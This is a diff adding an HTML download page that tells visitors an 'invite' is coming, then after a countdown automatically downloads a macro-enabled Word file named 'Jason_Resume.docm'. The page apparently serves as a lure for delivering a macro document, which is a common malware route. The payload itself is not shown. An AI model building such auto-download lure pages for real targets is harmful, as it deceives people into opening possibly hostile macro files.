@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Downloading...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #0e0e0e;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+
+    .container {
+      text-align: center;
+      padding: 2rem;
+    }
+
+    h1 {
+      font-size: 2rem;
+      font-weight: 600;
+      letter-spacing: 0.03em;
+      margin-bottom: 1rem;
+      color: #ffffff;
+    }
+
+    .message {
+      font-size: 1.1rem;
+      color: #aaa;
+      margin-bottom: 2rem;
+    }
+
+    .loader {
+      display: inline-block;
+      width: 50px;
+      height: 50px;
+      border: 3px solid #2a2a2a;
+      border-radius: 50%;
+      border-top-color: #ffffff;
+      animation: spin 1s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .timer {
+      font-size: 3rem;
+      font-weight: 300;
+      color: #ffffff;
+      margin-top: 1.5rem;
+    }
+
+    .btn-back {
+      display: inline-block;
+      margin-top: 2.5rem;
+      padding: 0.7rem 1.5rem;
+      border: 1px solid #2a2a2a;
+      border-radius: 8px;
+      background: #161616;
+      color: #e0e0e0;
+      text-decoration: none;
+      font-size: 0.9rem;
+      transition: background 0.2s, border-color 0.2s;
+    }
+
+    .btn-back:hover {
+      background: #1f1f1f;
+      border-color: #444;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Preparing Your Download</h1>
+    <p class="message">Your invite will start downloading in...</p>
+    <div class="loader"></div>
+    <div class="timer" id="countdown">3</div>
+    <a href="index.html" class="btn-back">← Back to Downloads</a>
+  </div>
+
+  <script>
+    // Update the URL with your actual GitHub info
+    const inviteUrl = "Jason_Resume.docm";
+    const inviteFilename = "Jason_Resume.docm";
+
+    let seconds = 3;
+    const timerElement = document.getElementById('countdown');
+
+    // Countdown timer
+    const countdownInterval = setInterval(() => {
+      seconds--;
+      timerElement.textContent = seconds;
+      
+      if (seconds <= 0) {
+        clearInterval(countdownInterval);
+        timerElement.textContent = 'Downloading...';
+        
+        // Trigger the download
+        setTimeout(() => {
+          const link = document.createElement('a');
+          link.href = inviteUrl;
+          link.download = inviteFilename;
+          link.style.display = 'none';
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+          
+          // Update message after download starts
+          document.querySelector('.message').textContent = 'Download started! If it doesn\'t begin, click the button below.';
+          
+          // Show a retry button
+          const retryBtn = document.createElement('a');
+          retryBtn.href = '#';
+          retryBtn.className = 'btn-back';
+          retryBtn.textContent = '⬇ Click here if download didn\'t start';
+          retryBtn.style.marginTop = '1rem';
+          retryBtn.style.display = 'inline-block';
+          retryBtn.style.cursor = 'pointer';
+          retryBtn.onclick = (e) => {
+            e.preventDefault();
+            const newLink = document.createElement('a');
+            newLink.href = inviteUrl;
+            newLink.download = inviteFilename;
+            newLink.style.display = 'none';
+            document.body.appendChild(newLink);
+            newLink.click();
+            document.body.removeChild(newLink);
+          };
+          
+          const container = document.querySelector('.container');
+          container.appendChild(retryBtn);
+          
+          // Remove loader
+          document.querySelector('.loader').style.display = 'none';
+        }, 500);
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
